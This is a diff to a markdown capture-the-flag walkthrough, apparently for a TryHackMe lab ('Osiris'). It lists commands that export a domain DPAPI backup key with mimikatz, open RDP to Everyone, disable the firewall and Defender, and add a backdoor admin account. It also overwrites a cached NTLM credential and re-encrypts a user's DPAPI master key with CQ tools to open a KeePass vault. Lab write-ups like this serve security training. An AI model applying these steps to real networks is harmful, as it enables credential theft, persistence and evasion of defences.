@@ -54,10 +54,17 @@ The problem is there is no active session for chajoh to hijack, so we would need
 
 The steps below require mimikatz: grab this [from here](https://github.com/gentilkiwi/mimikatz/releases), extract on the attacker machine, and then use x64/mimikatz.exe in your endeavours.
 
+The ops also require some CQ tools, CQMasterKeyAD.exe and CQDPAPIBlobSearcher.exe. These were very hard to find :(
+
 Steps:
 
-1. Get the dpapi backup key from [Ra](https://tryhackme.com/room/ra) or [Ra 2](https://tryhackme.com/room/ra2): Once getting system/admin on these machines, get and run mimikatz and then `lsadump::backupkeys /system:localhost /export`. Exfiltrate the pfx file.
+1. Get the dpapi backup key from [Ra](https://tryhackme.com/room/ra) or [Ra 2](https://tryhackme.com/room/ra2): Once getting system/admin on these machines, get and run mimikatz and then `lsadump::backupkeys /system:localhost /export`. Exfiltrate the pfx file. This will then need to have its password changed from `mimikatz` to `cqure`, with `openssl pkcs12 -in DMK.pfx -out temp.pem -nodes` and `openssl pkcs12 -export -out DMK.pfx -in temp.pem`
 2. Enable remote desktop access to the Osiris machine: `Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0` and add everyone to remote desktop users: `net localgroup "Remote Desktop Users" Everyone /add`. You also need to disable the firewall: `netsh advfirewall set allprofiles state off`
 3. Osiris will block mimikatz, so you need to disable defender, There are a few ways to do this, but the simplest for me was to create a new admin user, login and disable it manually through windows security: `net user aquinas P@ssw0rd! /add` and `net localgroup Administrators aquinas /add` (also add to remote desktop users). Once connected over remote desktop, I disabled defender in `windows security > virus & threat protection > virus & threat protection settings > real-time protection`
 4. Get mimikatz onto Osiris and replace cherjoh's password in the ntlm cache: `lsadump::cache /user:chajoh /password:NewPassword1234 /Kiwi`
 5. You can then connect over remote desktop, using `windcorp.thm\chajoh` and the new password.
+6. The final extraction from the database is complicated. Use this to find the file name of the key used to secure the keepass database: 
+`.\CQDPAPIBlobSearcher.exe /d C:\Users\chajoh\AppData\Roaming /r /o C:\Users\chajoh\Desktop\`. This should find a guid which corresponds to a file under chajoh\appdata\roaming\microsoft\protect\SID
+7. Re-encrypt the key with `.\CQMasterKeyAD.exe /file C:\Users\chajoh\AppData\Roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa /pfx .\DMK.pfx /newhash bce4433c7aafc0dbafcc69883f050a15`. Apply the right attributes to make this a system file: `attrib "C:\Users\chajoh\AppData\Roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" +S +H`.
+
+All going well you should be able to open the keepass file now. It seems quite finicky.
